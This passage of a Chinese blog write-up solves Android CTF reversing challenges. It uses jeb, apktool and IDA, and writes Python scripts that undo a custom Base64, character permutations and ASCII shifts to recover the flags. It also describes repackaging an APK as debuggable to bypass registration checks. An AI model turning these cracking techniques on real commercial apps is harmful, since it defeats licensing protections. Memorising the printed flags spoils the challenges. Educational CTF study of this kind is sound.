class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> s <span class="keyword">in</span> base64_str <span class="keyword">if</span> s != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    resp = <span class="built_in">bytearray</span>()</span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">4</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">4</span></span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">4</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>]]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">            resp.append(i)</span><br><span class="line">         integral_part = integral_part[<span class="number">4</span>:]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[nums * <span class="number">4</span>:])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remain - <span class="number">1</span>)]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">         resp.append(i)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_base64_str</span>(<span class="params">b_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b_str) % <span class="number">4</span>:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> b_str:</span><br><span class="line">     <span class="keyword">if</span> m != <span class="string">&quot;=&quot;</span> <span class="keyword">and</span> m <span class="keyword">not</span> <span class="keyword">in</span> base64_charset:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">     local_base64 = <span class="string">&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;使用本地base64解密：&#x27;</span>, decode(local_base64).decode())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用本地base64解密： 05397c42f9b6da593a3644162d36eb01</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;05397c42f9b6da593a3644162d36eb01&#125;</span><br></pre></td></tr></table></figure><h1 id="5-RememberOther"><a href="#5-RememberOther" class="headerlink" title="5. RememberOther"></a>5. RememberOther</h1><p>运行一下程序。</p><img src="/posts/9f62af2/5.1.png" class="" title="运行程序"><p>拿去AK，没有看到需要动态调试的so文件。</p><p>拿去jeb分析代码：</p><img src="/posts/9f62af2/5.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/5.3.png" class="" title="jeb分析"><p>那我们试试直接点注册。</p><img src="/posts/9f62af2/5.4.png" class="" title="出现MD5值"><p>MD5的奇数位为<code>b216ebb92fa5caf6</code>，再将MD5值解密，解出来为<code>YOU_KNOW_</code>(究竟哪个网站可以免费解MD5，我还是看牛牛们的wp才知道是这个答案)。拿到程序去验证没错。<code>YOU_KNOW_</code>很明显是flag形式，后面还缺了些东西，出题人给了剩下的线索。</p><img src="/posts/9f62af2/5.5.png" class="" title="线索"><p>你懂！你懂安卓！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOU_KNOW_ANDROID</span><br></pre></td></tr></table></figure><h1 id="6-easyjni"><a href="#6-easyjni" class="headerlink" title="6. easyjni"></a>6. easyjni</h1><p>这道题看名字就知道考察jni。</p><img src="/posts/9f62af2/6.1.png" class="" title="运行程序"><p>载入AK，看到lib目录下有<code>libnative.so</code>文件，是armeabi-v7a架构的。载入jeb，代码混淆了，没关系一个个方法分析。</p><p>在判断语句，调用了MainActivity.a方法，其中一个实参就是我们输入的内容。MainActivity.a方法返回到私有a方法里，形参是我们输入的内容。再看私有a方法，调用了ncheck()方法。</p><img src="/posts/9f62af2/6.2.png" class="" title="jeb分析"><p>调用ncheck()方法前，还创建了一个a类对象，先进去看看a类的a方法。发现是变种Base64加密。</p><img src="/posts/9f62af2/6.3.png" class="" title="jeb分析"><p>将apk文件解包，将里面的so文件载入IDA。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;apktool d easyjni.apk</span><br><span class="line">I: Using Apktool 2.6.1 on easyjni.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: C:\Users\dell\AppData\Local\apktool\framework\1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure><p>在Export模块找到ncheck()方法。</p><img src="/posts/9f62af2/6.4.png" class="" title="IDA分析"><img src="/posts/9f62af2/6.5.png" class="" title="IDA分析"><p>哇这就有点恶心人了哈，我从没见过等号在中间的。仔细分析一下IDA源码，原来不过如此。</p><img src="/posts/9f62af2/6.6.png" class="" title="IDA分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MbT3sQgX039i3g==AQOoMQFPskB1Bsc7</span><br><span class="line"></span><br><span class="line"># i和i+1对换</span><br><span class="line">bM3TQsXg30i9g3==QAoOQMPFks1BsB7c</span><br><span class="line"></span><br><span class="line"># 前16位与后16位对换</span><br><span class="line">QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span><br></pre></td></tr></table></figure><p>再用4中的变种Base64脚本解决。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># base 字符集</span></span><br><span class="line"><span class="comment"># base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + &#x27;+/&#x27;</span></span><br><span class="line">base64_charset = <span class="string">&quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位</span></span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes]</span><br><span class="line">     </span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">3</span>     </span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line">         <span class="comment"># 取对应base64字符</span></span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit])</span><br><span class="line">         integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         <span class="comment"># 补⻬三个字节，每个字节补充 0000 0000</span></span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         <span class="comment"># 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=</span></span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:remain + <span class="number">1</span>]</span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">base64_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_base64_str(base64_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytearray</span>()</span><br><span class="line">    </span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(base64_charset.index(s))).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> s <span class="keyword">in</span> base64_str <span class="keyword">if</span> s != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    resp = <span class="built_in">bytearray</span>()</span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">4</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">4</span></span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">4</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>]]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">            resp.append(i)</span><br><span class="line">         integral_part = integral_part[<span class="number">4</span>:]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[nums * <span class="number">4</span>:])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remain - <span class="number">1</span>)]</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">         resp.append(i)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_base64_str</span>(<span class="params">b_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b_str) % <span class="number">4</span>:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> b_str:</span><br><span class="line">     <span class="keyword">if</span> m != <span class="string">&quot;=&quot;</span> <span class="keyword">and</span> m <span class="keyword">not</span> <span class="keyword">in</span> base64_charset:</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">     local_base64 = <span class="string">&quot;QAoOQMPFks1BsB7cbM3TQsXg30i9g3==&quot;</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;使用本地base64解密：&#x27;</span>, decode(local_base64).decode())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用本地base64解密： flag&#123;just_ANot#er_@p3&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="7-easy-so"><a href="#7-easy-so" class="headerlink" title="7. easy-so"></a>7. easy-so</h1><p>运行程序。</p><img src="/posts/9f62af2/7.1.png" class="" title="运行程序"><p>看题目，肯定有so文件，载入AK发现4种架构都有，可以快乐地玩耍了。</p><p>载入jeb分析源码。</p><img src="/posts/9f62af2/7.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/7.3.png" class="" title="jeb分析"><p>我们需要做的就是将CheckString方法的返回值为1。解包，用x86架构的so文件载入IDA。因为我用的模拟器是x86架构的。</p><img src="/posts/9f62af2/7.4.png" class="" title="IDA分析"><p>这个与6的题目考点几乎一模一样，只是没了变种Base64的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f72c5a36569418a20907b55be5bf95ad</span><br><span class="line"></span><br><span class="line"># i与i+1对换</span><br><span class="line">7fc2a5636549812a90705bb55efb59da</span><br><span class="line"></span><br><span class="line"># 前16位与后16位对换</span><br><span class="line">90705bb55efb59da7fc2a5636549812a</span><br></pre></td></tr></table></figure><p>拿去程序里运行验证一下，验证通过。</p><img src="/posts/9f62af2/7.5.png" class="" title="验证通过"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;90705bb55efb59da7fc2a5636549812a&#125;</span><br></pre></td></tr></table></figure><h1 id="8-easyjava"><a href="#8-easyjava" class="headerlink" title="8. easyjava"></a>8. easyjava</h1><p>运行一下程序。</p><img src="/posts/9f62af2/8.1.png" class="" title="运行程序"><p>载入jeb分析：</p><img src="/posts/9f62af2/8.2.png" class="" title="jeb分析"><p>将b类和a类所有方法都分析一遍，反正后面也要用到。</p><img src="/posts/9f62af2/8.3.png" class="" title="b类"><img src="/posts/9f62af2/8.4.png" class="" title="b类"><img src="/posts/9f62af2/8.5.png" class="" title="a类"><img src="/posts/9f62af2/8.6.png" class="" title="a类"><p>回到MainActivity类，b.b和a.a的作用一样，都是以参数为边界，对换各自的c整形列表，所以v4和v5都应该是对换后的列表。经过分析a类和b类发现并没有增加或减少原本的长度，所以v2的长度就应该等于v3的长度，v3的长度从字符串中可以计算到是12，所以循环要经历12次。</p><p>以v2索引值为0的值为例，将v2索引值为0的值传入b.a方法，如果这个值可以转换成小写字母，则把b.b小写字母表中相同的小写字母的索引值取出，与a列表(也就是v4)的数组元素对比，如果取出的索引值与a列表中某个元素相同，则返回元素的索引值。更新b.a列表和b.b小写字母表，都是首位放最末位。将返回的a列表元素的索引值作为参数传入a.a方法，如果这个形参与a列表中(也就是v5)的元素相同，取出这个元素的索引值，作为a.b小写字母表中的索引，返回该索引的元素，也就是“w”。</p><p>用Python写出来相当于<code>a_alphabet[v5.index(v4.index(b_alphabet.index(ans[0])))] = w</code></p><p>现在我们要做的就是把这个过程逆回来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v4 = [<span class="number">17</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">22</span>,<span class="number">1</span>,<span class="number">16</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">18</span>,<span class="number">2</span>,<span class="number">24</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">25</span>]</span><br><span class="line">v5 = [<span class="number">21</span>,<span class="number">4</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">17</span>,<span class="number">6</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">18</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">16</span>]</span><br><span class="line">flag = <span class="string">&quot;wigwrkaugala&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">b_alphabet = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line">a_alphabet = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    halflag = a_alphabet.index(i)</span><br><span class="line">    ans += b_alphabet[v4[v5[halflag]]]</span><br><span class="line">    temp = v4[<span class="number">0</span>]</span><br><span class="line">    v4.pop(<span class="number">0</span>)</span><br><span class="line">    v4.append(temp)</span><br><span class="line">    temp = b_alphabet[<span class="number">0</span>]</span><br><span class="line">    b_alphabet.pop(<span class="number">0</span>)</span><br><span class="line">    b_alphabet.append(temp)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">venividivkcr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/posts/9f62af2/8.7.png" class="" title="运行成功"><p>嘤嘤嘤终于成功了，在做的时候看漏了很多细节，所以正确的flag一直出不来，还是要耐心一点！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;venividivkcr&#125;</span><br></pre></td></tr></table></figure><h1 id="9-Ph0en1x-100"><a href="#9-Ph0en1x-100" class="headerlink" title="9. Ph0en1x-100"></a>9. Ph0en1x-100</h1><img src="/posts/9f62af2/9.1.png" class="" title="运行程序"><p>载入AK，看到有lib文件。载入jeb分析源码。</p><img src="/posts/9f62af2/9.2.png" class="" title="jeb分析"><p>而getFlag和encrypt都是Native方法，需要在so文件查看详细内容。将程序解包，拿x86目录下的so文件载入IDA，查看getFlag和encrypt方法。</p><p>encrypt方法就是将输入的字符串中的每个字符的ASCII码都减1。</p><img src="/posts/9f62af2/9.3.png" class="" title="IDA分析"><p>getFlag方法看得就有点懵逼了，如果静态分析是在困难的话，可以考虑动态调试。</p><img src="/posts/9f62af2/9.4.png" class="" title="IDA分析"><p>动态调试需要满足<code>android:debuggable=&quot;true&quot;</code>，没有就要在AK中编辑添加，重新编译签名。</p><p>动态调试方法可看 <a href="https://v5le0n9.github.io/posts/15be101a.html?highlight=and#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81">https://v5le0n9.github.io/posts/15be101a.html?highlight=and#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81</a> 我就在这偷下懒了。</p><p>刚才静态分析中，很明显看到一个循环，那我们就在循环的下一句下断点，在程序中输入字符串点击按钮，IDA停在断点处。此时，查看寄存器窗口EDI的值，点击小箭头，跟随地址。</p><img src="/posts/9f62af2/9.5.png" class="" title="IDA动态调试"><img src="/posts/9f62af2/9.6.png" class="" title="IDA动态调试"><p>到了这里还没行，循环解决了但getFlag方法还未结束。F8步过观察字符串的变化。运行到快要结束时字符串已经不再变化了。在F8步过的过程中，发现<code>.</code>变成了<code>e</code>。所以正确的getFlag的返回值应该为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|</span><br></pre></td></tr></table></figure><p>所以我们输入的字符串中每个字符-1就是上面这个字符串。编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="10-黑客精神"><a href="#10-黑客精神" class="headerlink" title="10. 黑客精神"></a>10. 黑客精神</h1><p>运行程序，注册码保存后直接退出。</p><img src="/posts/9f62af2/10.1.png" class="" title="运行程序"><p>载入AK，有so文件，因为没有x86目录，如果要动态调试的话就要开我那个慢得要死的AS原生模拟器了。</p><p>载入jeb，分析源码：</p><img src="/posts/9f62af2/10.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/10.3.png" class="" title="jeb分析"><img src="/posts/9f62af2/10.4.png" class="" title="jeb分析"><img src="/posts/9f62af2/10.5.png" class="" title="jeb分析"><p>看到有Log语句，赶紧打开AS连接上模拟器运行一下看看Log。程序一进去就显示m=0，然后再m=Xman。</p><img src="/posts/9f62af2/10.6.png" class="" title="AS中Logcat窗口"><p>说明程序在打开窗口前就已经载入so文件读取m的值，但它是静态的，如果我们注册过的话，程序会读取m=1，不会让我们再次注册。so文件的onCreate方法中，第一句就是初始化SN，所以m的值应该是在native方法initSN中存着。</p><p>将so文件载入IDA，在导出表里找不到initSN方法，也找不到所有native方法，但看到了JNI_Onload，说明整个过程都是在JNI_Onload里动态完成的。</p><img src="/posts/9f62af2/10.7.png" class="" title="IDAExport表"><p>点进JNI_Onload函数，查看源码：</p><img src="/posts/9f62af2/10.8.png" class="" title="IDA分析"><img src="/posts/9f62af2/10.9.png" class="" title="IDA分析"><img src="/posts/9f62af2/10.10.png" class="" title="IDA分析"><p>所以<code>EoPAoY62@ElRD</code>应该就是注册码，但输入发现不对…Logcat窗口还是显示m=0。</p><p>那继续分析saveSN。</p><img src="/posts/9f62af2/10.11.png" class="" title="IDA分析"><p>现在可以捋一下思路了，<code>W3_arE_whO_we_ARE</code>是要加密的字符串，<code>EoPAoY62@ElRD</code>相当于密钥，作为参数传入saveSN。v7存着的就是密钥。</p><p>把这个加密算法用Python写一遍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 